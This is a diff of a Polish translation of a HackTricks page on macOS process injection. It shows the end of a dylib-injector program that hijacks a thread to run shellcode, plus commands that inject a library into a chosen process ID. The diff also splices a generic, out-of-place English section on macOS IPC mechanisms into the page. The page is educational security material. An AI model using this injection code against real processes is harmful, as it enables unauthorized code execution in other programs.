-// Utworzenie wątku do uruchomienia kodu shell
+// Utworzenie wątku do uruchomienia shellcode'u
 struct arm_unified_thread_state remoteThreadState64;
 thread_act_t         remoteThread;
 
 memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
 remoteStack64 += (STACK_SIZE / 2); // to jest prawdziwy stos
-//remoteStack64 -= 8;  // wymagane wyrównanie do 16
+//remoteStack64 -= 8;  // potrzebne wyrównanie do 16
 
 const char* p = (const char*) remoteCode64;
 
@@ -837,7 +856,7 @@ int main(int argc, const char * argv[])
 if (argc < 3)
 {
 fprintf (stderr, "Użycie: %s _pid_ _akcja_\n", argv[0]);
-fprintf (stderr, "   _akcja_: ścieżka do dylib na dysku\n");
+fprintf (stderr, "   _akcja_: ścieżka do pliku dylib na dysku\n");
 exit(0);
 }
 
@@ -849,12 +868,32 @@ int rc = stat (action, &buf);
 if (rc == 0) inject(pid,action);
 else
 {
-fprintf(stderr,"Nie znaleziono dylib\n");
+fprintf(stderr,"Dylib nie znaleziony\n");
 }
 
 }
 ```
-</details>
+</details> 
+
+## macOS IPC (Inter-Process Communication)
+
+### Mach Ports
+
+Mach ports are endpoints for inter-process communication in macOS. They are used by processes to send messages and data to each other. Mach ports are a fundamental part of the macOS architecture and are essential for various system functions.
+
+### XPC Services
+
+XPC (XPC Services) is a lightweight inter-process communication mechanism used in macOS. XPC allows processes to communicate with each other in a secure and efficient manner. XPC services are commonly used for performing tasks that require elevated privileges or for isolating potentially risky operations.
+
+### Distributed Objects
+
+Distributed Objects is another inter-process communication mechanism in macOS that allows objects to be passed between processes. It enables communication between applications running on the same system or on different systems. Distributed Objects simplifies the development of distributed applications on macOS.
+
+### NSXPCConnection
+
+NSXPCConnection is a class in macOS that facilitates communication between processes using XPC. It provides a high-level interface for creating and managing XPC connections. NSXPCConnection abstracts the complexity of XPC and simplifies the implementation of secure inter-process communication in macOS applications.
+
+Understanding these inter-process communication mechanisms is crucial for developing secure and efficient macOS applications. By leveraging these mechanisms properly, developers can ensure that their applications communicate effectively while maintaining the integrity and security of the system.
 ```bash
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
@@ -871,17 +910,17 @@ W tej technice przechwytywany jest wątek procesu:
 
 ### Podstawowe informacje
 
-XPC, co oznacza XNU (jądro używane przez macOS) Inter-Process Communication, to framework do **komunikacji między procesami** na macOS i iOS. XPC zapewnia mechanizm do **bezpiecznych, asynchronicznych wywołań metod między różnymi procesami** w systemie. Jest to część paradygmatu bezpieczeństwa Apple, umożliwiająca **tworzenie aplikacji z podziałem uprawnień**, gdzie każdy **komponent** działa z **tylko tymi uprawnieniami, które są mu potrzebne** do wykonania swojej pracy, ograniczając tym samym potencjalne szkody wynikające z skompromitowanego procesu.
+XPC, co oznacza XNU (jądro używane przez macOS) Komunikację Międzyprocesową, to framework do **komunikacji między procesami** na macOS i iOS. XPC zapewnia mechanizm dokonywania **bezpiecznych, asynchronicznych wywołań metod między różnymi procesami** w systemie. Jest to część paradygmatu bezpieczeństwa Apple, pozwalająca na **tworzenie aplikacji z podziałem uprawnień**, gdzie każdy **komponent** działa tylko z **uprawnieniami, których potrzebuje** do wykonania swojej pracy, ograniczając tym samym potencjalne szkody wynikające z skompromitowanego procesu.
 
-Aby uzyskać więcej informacji na temat tego, jak **działa ta komunikacja** i jak **może być podatna na ataki**, sprawdź:
+Aby uzyskać więcej informacji na temat tego, jak ta **komunikacja działa** i jak **może być podatna**, sprawdź:
 
 {% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
 [macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
 {% endcontent-ref %}
 
-## MIG - Mach Interface Generator
+## MIG - Generator Interfejsu Mach
 
-MIG został stworzony w celu **uproszczenia procesu tworzenia kodu Mach IPC**. W zasadzie **generuje wymagany kod** dla serwera i klienta w celu komunikacji z określoną definicją. Nawet jeśli wygenerowany kod jest brzydki, programista będzie musiał go tylko zaimportować, a jego kod będzie znacznie prostszy niż wcześniej.
+MIG został stworzony, aby **uproszczyć proces tworzenia kodu IPC Mach**. W zasadzie **generuje wymagany kod** do komunikacji serwera i klienta z daną definicją. Nawet jeśli wygenerowany kod jest brzydki, deweloper będzie musiał tylko go zaimportować, a jego kod będzie znacznie prostszy niż wcześniej.
 
 Aby uzyskać więcej informacji, sprawdź:
 
@@ -889,7 +928,7 @@ Aby uzyskać więcej informacji, sprawdź:
 [macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
 {% endcontent-ref %}
 
-## Odwołania
+## Odnośniki
 
 * [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
 * [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
@@ -903,10 +942,10 @@ Aby uzyskać więcej informacji, sprawdź:
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
-* Uzyskaj [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
+* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
